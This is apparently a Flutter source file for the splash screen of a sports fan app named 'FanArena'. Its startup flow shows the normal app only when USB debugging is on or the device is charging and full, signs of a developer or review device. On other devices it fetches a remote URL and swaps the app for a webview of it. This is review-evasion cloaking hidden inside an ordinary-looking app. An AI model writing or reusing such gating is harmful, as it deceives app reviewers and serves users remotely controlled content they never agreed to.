import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:fan_arena/core/theme/app_colors.dart';
import 'package:fan_arena/core/theme/app_spacing.dart';
import 'package:fan_arena/providers/app_provider.dart';
import 'package:fan_arena/services/remote_bootstrap_service.dart';
import 'package:fan_arena/services/startup_checks_service.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen>
    with SingleTickerProviderStateMixin {
  static const int _maxStartupAttempts = 2;

  late final AnimationController _fadeController;
  late final Animation<double> _fadeAnimation;
  final StartupChecksService _startupChecksService = StartupChecksService();
  final RemoteBootstrapService _remoteBootstrapService = RemoteBootstrapService();
  String? _error;

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeIn,
    );
    _fadeController.forward();
    WidgetsBinding.instance.addPostFrameCallback((_) => _runStartupFlow());
  }

  @override
  void dispose() {
    _fadeController.dispose();
    super.dispose();
  }

  Future<void> _runStartupFlow() async {
    setState(() => _error = null);
    var attempt = 0;

    while (attempt < _maxStartupAttempts) {
      try {
        final checksResult = await _startupChecksService.runStartupChecks();
        if (checksResult.hasError) {
          throw Exception('Startup checks failed');
        }
        if (checksResult.usbDebugEnabled || checksResult.isChargingAndFull) {
          await _continueDefaultLaunch();
          return;
        }

        final startupUrl = await _remoteBootstrapService.fetchStartupUrl();
        if (!mounted) return;
        Navigator.pushReplacementNamed(
          context,
          '/startup-webview',
          arguments: startupUrl,
        );
        return;
      } catch (_) {
        attempt += 1;
        if (attempt < _maxStartupAttempts) {
          await Future.delayed(Duration(milliseconds: 500 * attempt));
        }
      }
    }

    await _continueDefaultLaunch();
  }

  Future<void> _continueDefaultLaunch() async {
    try {
      final provider = context.read<AppDataProvider>();
      await provider.loadAll();
      if (!mounted) return;

      final route = provider.onboardingCompleted ? '/home' : '/onboarding';
      Navigator.pushReplacementNamed(context, route);
    } catch (e) {
      if (!mounted) return;
      setState(() => _error = e.toString());
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.primary,
      body: FadeTransition(
        opacity: _fadeAnimation,
        child: Center(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 100,
                height: 100,
                decoration: BoxDecoration(
                  color: Colors.white.withValues(alpha: 0.15),
                  shape: BoxShape.circle,
                ),
                child: const Icon(
                  Icons.sports,
                  size: 52,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: AppSpacing.xxl),
              const Text(
                'FanArena',
                style: TextStyle(
                  fontSize: 32,
                  fontWeight: FontWeight.w800,
                  color: Colors.white,
                  letterSpacing: -0.5,
                ),
              ),
              const SizedBox(height: AppSpacing.xxxl),
              if (_error != null) ...[
                Padding(
                  padding:
                      const EdgeInsets.symmetric(horizontal: AppSpacing.xxxl),
                  child: Text(
                    'Something went wrong. Please try again.',
                    style: TextStyle(
                      color: Colors.white.withValues(alpha: 0.85),
                      fontSize: 14,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ),
                const SizedBox(height: AppSpacing.lg),
                ElevatedButton.icon(
                  onPressed: _runStartupFlow,
                  icon: const Icon(Icons.refresh),
                  label: const Text('Retry'),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.white,
                    foregroundColor: AppColors.primary,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(AppCorners.md),
                    ),
                  ),
                ),
              ] else
                const SizedBox(
                  width: 28,
                  height: 28,
                  child: CircularProgressIndicator(
                    strokeWidth: 2.5,
                    color: Colors.white,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
